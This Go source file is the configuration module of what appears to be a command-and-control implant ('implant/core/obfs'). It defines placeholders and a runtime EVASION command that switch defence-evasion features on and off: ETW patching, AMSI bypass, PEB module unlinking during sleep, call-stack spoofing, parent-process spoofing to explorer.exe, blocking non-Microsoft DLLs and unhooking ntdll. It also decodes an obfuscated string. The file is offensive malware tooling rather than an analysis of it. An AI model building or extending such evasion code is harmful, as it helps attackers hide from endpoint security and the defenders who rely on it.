package config

import (
	"fmt"
	"runtime"
	"strings"
	"sync"

	"implant/core/obfs"
)

// P4：P0–P3 落地的对抗能力细分开关。
//
// 这些占位符与 ETW/AMSI 开关同构：服务端生成载荷时把字面量替换成定长 "1"/"0"，
// 客户端在运行期读字符串判断。**编译期值 = 默认值**，运行期可用 EVASION 命令覆盖
// （见 opsec_runtime 部分），覆盖只在内存里，重启即回到编译期值。
const (
	// SleepMaskHidePlaceholder 睡眠期模块摘链（1=beacon 睡眠窗口把自身从 PEB 模块链表摘除）
	SleepMaskHidePlaceholder = "SLEEP_MASK_HIDE_PLACEHOLDER_12345"
	// StackSpoofPlaceholder 伪造调用栈（1=direct syscall 前把栈构造成 ntdll 返回地址链）
	StackSpoofPlaceholder = "STACK_SPOOF_PLACEHOLDER_12345"
	// PpidSpoofPlaceholder 父进程伪造（1=派生子进程时把父进程改成 explorer.exe）
	PpidSpoofPlaceholder = "PPID_SPOOF_PLACEHOLDER_12345"
	// BlockDLLsPlaceholder 子进程只允许微软签名 DLL（1=启用）
	BlockDLLsPlaceholder = "BLOCK_DLLS_PLACEHOLDER_12345"
	// UnhookOnStartPlaceholder 启动时用磁盘映像恢复 ntdll/kernel32/kernelbase 的内联 hook
	UnhookOnStartPlaceholder = "UNHOOK_ON_START_PLACEHOLDER_12345"
)

// EvasionKey 是能力的稳定标识（命令回执与日志里用它，避免中英混排歧义）。
type EvasionKey string

const (
	EvasionETW       EvasionKey = "etw"
	EvasionAMSI      EvasionKey = "amsi"
	EvasionModHide   EvasionKey = "modhide"
	EvasionSpoof     EvasionKey = "spoof"
	EvasionPPID      EvasionKey = "ppid"
	EvasionBlockDLLs EvasionKey = "blockdlls"
	EvasionUnhook    EvasionKey = "unhook"
)

// EvasionCapability 描述一项可开关能力。
type EvasionCapability struct {
	Key EvasionKey
	// Zh/En 人类可读名
	Zh, En string
	// StartupOnly 为 true 表示"只在启动期执行"（ETW/AMSI 补丁、unhook）：
	// 运行期打开=立即执行一次，关掉无法把已改的字节恢复原样（回执里会说明）。
	StartupOnly bool
	// ReqAmd64 该能力只在 windows/amd64 有实现
	ReqAmd64 bool
	// ReqSyscallMode 非空时要求 syscallMode 等于该值才生效（spoof 只支持 direct）
	ReqSyscallMode string
	compiled       func() bool
}

var evasionCapabilities = []EvasionCapability{
	{Key: EvasionETW, Zh: "ETW 补丁", En: "ETW patch", StartupOnly: true, ReqAmd64: false, compiled: etwCompiled},
	{Key: EvasionAMSI, Zh: "AMSI 绕过", En: "AMSI bypass", StartupOnly: true, ReqAmd64: false, compiled: amsiCompiled},
	{Key: EvasionModHide, Zh: "睡眠期模块摘链", En: "module unlink during sleep", ReqAmd64: true, compiled: modHideCompiled},
	{Key: EvasionSpoof, Zh: "伪造调用栈", En: "call stack spoof", ReqAmd64: true, ReqSyscallMode: "direct", compiled: spoofCompiled},
	{Key: EvasionPPID, Zh: "父进程伪造", En: "PPID spoof", ReqAmd64: false, compiled: ppidSpoofCompiled},
	{Key: EvasionBlockDLLs, Zh: "子进程禁非微软 DLL", En: "block non-MS DLLs", ReqAmd64: false, compiled: blockDLLsCompiled},
	{Key: EvasionUnhook, Zh: "启动期 unhook", En: "unhook on start", StartupOnly: true, ReqAmd64: true, compiled: unhookOnStartCompiled},
}

func placeholderOnOff(ph string) bool {
	s := strings.TrimSpace(ph)
	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
}

func etwCompiled() bool       { return placeholderOnOff(ETWPatchPlaceholder) }
func amsiCompiled() bool      { return placeholderOnOff(AmsiBypassPlaceholder) }
func modHideCompiled() bool   { return placeholderOnOff(SleepMaskHidePlaceholder) }
func spoofCompiled() bool     { return placeholderOnOff(StackSpoofPlaceholder) }
func ppidSpoofCompiled() bool { return placeholderOnOff(PpidSpoofPlaceholder) }
func blockDLLsCompiled() bool { return placeholderOnOff(BlockDLLsPlaceholder) }
func unhookOnStartCompiled() bool {
	return placeholderOnOff(UnhookOnStartPlaceholder)
}

// evasionOverride 是运行期覆盖表（只在内存；不落盘、不跨重连）。
//
// 用三态：键不存在 = 用编译期值；存在 = 显式开/关。这样"运行期关掉"与
// "本来就没开"在回执里能区分开（后者写"编译期未启用"，前者写"运行期已关闭"）。
type evasionState struct {
	mu       sync.RWMutex
	override map[EvasionKey]bool
	// touched 记录被运行期改过的键，用于 reset 时的回执
	touched []EvasionKey
}

var evasionRt = &evasionState{override: map[EvasionKey]bool{}}

// capability 按 key 查描述。
func capability(key EvasionKey) (EvasionCapability, bool) {
	for _, c := range evasionCapabilities {
		if c.Key == key {
			return c, true
		}
	}
	return EvasionCapability{}, false
}

// EvasionCapabilities 返回全部能力描述（顺序固定，供命令回执与测试使用）。
func EvasionCapabilities() []EvasionCapability {
	out := make([]EvasionCapability, len(evasionCapabilities))
	copy(out, evasionCapabilities)
	return out
}

// EvasionCompiled 返回编译期（生成载荷时）的取值。
func EvasionCompiled(key EvasionKey) bool {
	if c, ok := capability(key); ok {
		return c.compiled()
	}
	return false
}

// EvasionEnabled 返回**当前生效值**：运行期覆盖优先，否则编译期值。
func EvasionEnabled(key EvasionKey) bool {
	evasionRt.mu.RLock()
	v, ok := evasionRt.override[key]
	evasionRt.mu.RUnlock()
	if ok {
		return v
	}
	return EvasionCompiled(key)
}

// EvasionImpossibleReason 返回"这项能力在当前载荷/平台上根本不可能生效"的原因；
// 空串表示可以生效。用于把"勾了却没反应"变成一句明确的话。
func EvasionImpossibleReason(key EvasionKey) string {
	c, ok := capability(key)
	if !ok {
		return "未知能力: " + string(key)
	}
	if c.ReqAmd64 && runtime.GOARCH != "amd64" {
		return fmt.Sprintf("%s 仅 windows/amd64 实现，当前构建 arch=%s", c.Zh, runtime.GOARCH)
	}
	if c.ReqSyscallMode != "" {
		if got := SyscallMode(); got != c.ReqSyscallMode {
			return fmt.Sprintf("%s 需要 syscallMode=%s，当前=%s（生成期固定，运行期无法改）",
				c.Zh, c.ReqSyscallMode, got)
		}
	}
	return ""
}

// SetEvasionOverride 设置运行期覆盖。返回错误表示"改不了"（平台不满足等）。
func SetEvasionOverride(key EvasionKey, on bool) error {
	if _, ok := capability(key); !ok {
		return fmt.Errorf("未知能力: %s", key)
	}
	evasionRt.mu.Lock()
	defer evasionRt.mu.Unlock()
	evasionRt.override[key] = on
	found := false
	for _, k := range evasionRt.touched {
		if k == key {
			found = true
			break
		}
	}
	if !found {
		evasionRt.touched = append(evasionRt.touched, key)
	}
	return nil
}

// ClearEvasionOverrides 清除全部运行期覆盖（回到编译期值），返回被清除的键。
func ClearEvasionOverrides() []EvasionKey {
	evasionRt.mu.Lock()
	defer evasionRt.mu.Unlock()
	keys := append([]EvasionKey{}, evasionRt.touched...)
	evasionRt.override = map[EvasionKey]bool{}
	evasionRt.touched = nil
	return keys
}

// EvasionStatusRow 是 EVASION 命令的一条回执行。
type EvasionStatusRow struct {
	Key      EvasionKey
	Zh       string
	En       string
	Compiled bool
	Active   bool
	// Overridden 表示当前生效值来自运行期覆盖
	Overridden bool
	// Note 附加说明（启动期能力已执行/无法回滚等）
	Note string
}

// EvasionStatus 返回全部能力的当前状态。
func EvasionStatus() []EvasionStatusRow {
	evasionRt.mu.RLock()
	over := make(map[EvasionKey]bool, len(evasionRt.override))
	for k, v := range evasionRt.override {
		over[k] = v
	}
	evasionRt.mu.RUnlock()

	rows := make([]EvasionStatusRow, 0, len(evasionCapabilities))
	for _, c := range evasionCapabilities {
		row := EvasionStatusRow{
			Key:      c.Key,
			Zh:       c.Zh,
			En:       c.En,
			Compiled: c.compiled(),
		}
		if v, ok := over[c.Key]; ok {
			row.Overridden = true
			row.Active = v
		} else {
			row.Active = row.Compiled
		}
		if c.StartupOnly {
			row.Note = "启动期能力：运行期打开=立即执行一次，关掉不会撤销已打的补丁"
		}
		rows = append(rows, row)
	}
	return rows
}

// hostEvasionCompiledAny 供 HostEvasionEnabled 使用（保持既有语义：ETW∥AMSI∥syscall）。
func hostEvasionCompiledAny() bool {
	return EvasionEnabled(EvasionETW) || EvasionEnabled(EvasionAMSI) || SyscallMode() != "none"
}
